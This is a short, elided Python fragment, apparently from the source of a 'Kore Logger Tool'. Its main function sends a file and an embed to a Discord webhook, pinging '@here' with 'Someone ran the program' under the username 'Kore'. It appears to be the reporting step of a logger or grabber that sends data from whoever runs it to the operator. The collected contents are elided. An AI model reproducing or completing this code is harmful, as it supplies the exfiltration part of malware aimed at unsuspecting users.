...
def main(webhook_url):
    ...
    embed = Embed(title="Kore Logger Tool", color=15535980)
    ...
    webhook.send(content="||@here|| Someone ran the program", embed=embed, file=file, avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Kore")
